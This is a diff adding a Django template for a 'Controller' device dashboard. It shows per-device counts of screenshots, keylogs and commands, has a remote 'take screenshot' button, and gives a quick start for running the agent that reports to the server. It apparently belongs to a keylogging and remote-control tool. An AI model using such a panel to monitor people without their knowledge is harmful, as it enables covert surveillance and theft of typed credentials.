@@ -1,0 +1,175 @@
+{% extends 'base.html' %}
+
+{% block title %}Devices - Controller{% endblock %}
+{% block page_title %}Devices{% endblock %}
+
+{% block content %}
+<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
+    <div>
+        <p style="color: var(--text-secondary); font-size: 14px;">
+            Manage and monitor all connected devices
+        </p>
+    </div>
+    <div style="display: flex; gap: 12px;">
+        <button class="btn btn-secondary" onclick="location.reload()">
+            <i class="ph ph-arrows-clockwise"></i>
+            Refresh
+        </button>
+    </div>
+</div>
+
+<!-- Filters -->
+<div class="card fade-in" style="margin-bottom: 24px;">
+    <div class="card-body" style="padding: 16px 24px;">
+        <div style="display: flex; gap: 16px; align-items: center; flex-wrap: wrap;">
+            <div style="display: flex; align-items: center; gap: 8px;">
+                <span style="font-size: 14px; color: var(--text-secondary);">Status:</span>
+                <select id="statusFilter" style="background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 8px 12px; color: var(--text-primary); font-size: 14px;" onchange="filterDevices()">
+                    <option value="all">All</option>
+                    <option value="online">Online</option>
+                    <option value="offline">Offline</option>
+                </select>
+            </div>
+            <div style="flex: 1;">
+                <input type="text" id="searchInput" placeholder="Search by hostname or ID..." style="width: 100%; max-width: 300px; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 8px 12px; color: var(--text-primary); font-size: 14px;" onkeyup="filterDevices()">
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Device Grid -->
+<div class="device-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px;">
+    {% for device in devices %}
+    <div class="card fade-in device-card" data-hostname="{{ device.hostname|lower }}" data-id="{{ device.device_id|lower }}" data-status="{% if device.is_online %}online{% else %}offline{% endif %}">
+        <div class="card-body">
+            <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 16px;">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <div style="width: 48px; height: 48px; background: var(--bg-tertiary); border-radius: var(--radius-md); display: flex; align-items: center; justify-content: center;">
+                        <i class="ph-bold ph-desktop" style="font-size: 24px; color: var(--accent-primary);"></i>
+                    </div>
+                    <div>
+                        <h4 style="font-weight: 600; margin-bottom: 2px;">{{ device.hostname }}</h4>
+                        <div style="font-size: 12px; color: var(--text-muted); font-family: monospace;">{{ device.device_id|truncatechars:20 }}</div>
+                    </div>
+                </div>
+                {% if device.is_online %}
+                <span class="badge badge-success">
+                    <span class="badge-dot pulse"></span>
+                    Online
+                </span>
+                {% else %}
+                <span class="badge badge-warning">
+                    <span class="badge-dot"></span>
+                    Offline
+                </span>
+                {% endif %}
+            </div>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px;">
+                <div style="padding: 12px; background: var(--bg-tertiary); border-radius: var(--radius-sm);">
+                    <div style="font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">OS</div>
+                    <div style="font-size: 13px;">{{ device.os_version|default:"Windows" }}</div>
+                </div>
+                <div style="padding: 12px; background: var(--bg-tertiary); border-radius: var(--radius-sm);">
+                    <div style="font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Last Seen</div>
+                    <div style="font-size: 13px;">{{ device.last_seen|timesince }} ago</div>
+                </div>
+            </div>
+            
+            <div style="display: flex; gap: 12px; margin-bottom: 16px;">
+                <div style="flex: 1; text-align: center; padding: 8px; background: var(--bg-tertiary); border-radius: var(--radius-sm);">
+                    <div style="font-size: 18px; font-weight: 600; color: var(--accent-primary);">{{ device.screenshot_count }}</div>
+                    <div style="font-size: 11px; color: var(--text-muted);">Screenshots</div>
+                </div>
+                <div style="flex: 1; text-align: center; padding: 8px; background: var(--bg-tertiary); border-radius: var(--radius-sm);">
+                    <div style="font-size: 18px; font-weight: 600; color: var(--success);">{{ device.keylog_count }}</div>
+                    <div style="font-size: 11px; color: var(--text-muted);">Keylogs</div>
+                </div>
+                <div style="flex: 1; text-align: center; padding: 8px; background: var(--bg-tertiary); border-radius: var(--radius-sm);">
+                    <div style="font-size: 18px; font-weight: 600; color: var(--warning);">{{ device.command_count }}</div>
+                    <div style="font-size: 11px; color: var(--text-muted);">Commands</div>
+                </div>
+            </div>
+            
+            <div style="display: flex; gap: 8px;">
+                <a href="{% url 'device_detail' device.device_id %}" class="btn btn-primary" style="flex: 1; justify-content: center;">
+                    <i class="ph ph-eye"></i>
+                    View Details
+                </a>
+                <button class="btn btn-secondary btn-icon" title="Take Screenshot" onclick="takeScreenshot('{{ device.device_id }}')">
+                    <i class="ph ph-camera"></i>
+                </button>
+                <button class="btn btn-secondary btn-icon" title="Settings" onclick="location.href='{% url 'device_settings' device.device_id %}'">
+                    <i class="ph ph-gear"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+    {% empty %}
+    <div style="grid-column: 1 / -1;">
+        <div class="card fade-in">
+            <div class="empty-state" style="padding: 60px 20px;">
+                <i class="ph ph-devices" style="font-size: 64px;"></i>
+                <h3 style="margin-top: 16px;">No devices connected</h3>
+                <p style="max-width: 400px; margin: 8px auto 24px;">
+                    Once a device runs the Controller Agent and connects to this server, it will appear here.
+                </p>
+                <div style="background: var(--bg-tertiary); border-radius: var(--radius-md); padding: 24px; text-align: left; max-width: 500px; margin: 0 auto;">
+                    <h4 style="margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
+                        <i class="ph ph-terminal"></i>
+                        Quick Start
+                    </h4>
+                    <ol style="color: var(--text-secondary); font-size: 14px; padding-left: 20px; line-height: 2;">
+                        <li>Configure <code style="background: var(--bg-primary); padding: 2px 6px; border-radius: 4px;">agent/.env</code> with this server URL</li>
+                        <li>Run <code style="background: var(--bg-primary); padding: 2px 6px; border-radius: 4px;">python -m agent.main</code></li>
+                        <li>Refresh this page to see the device</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+    </div>
+    {% endfor %}
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function filterDevices() {
+    const statusFilter = document.getElementById('statusFilter').value;
+    const searchQuery = document.getElementById('searchInput').value.toLowerCase();
+    
+    document.querySelectorAll('.device-card').forEach(card => {
+        const hostname = card.dataset.hostname;
+        const id = card.dataset.id;
+        const status = card.dataset.status;
+        
+        let showByStatus = statusFilter === 'all' || status === statusFilter;
+        let showBySearch = !searchQuery || hostname.includes(searchQuery) || id.includes(searchQuery);
+        
+        card.style.display = (showByStatus && showBySearch) ? 'block' : 'none';
+    });
+}
+
+function takeScreenshot(deviceId) {
+    fetch('/api/commands/send/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': '{{ csrf_token }}'
+        },
+        body: JSON.stringify({
+            device_id: deviceId,
+            command_type: 'screenshot',
+            payload: {}
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        alert('Screenshot command sent!');
+    })
+    .catch(err => {
+        alert('Failed to send command');
+    });
+}
+</script>
+{% endblock %}
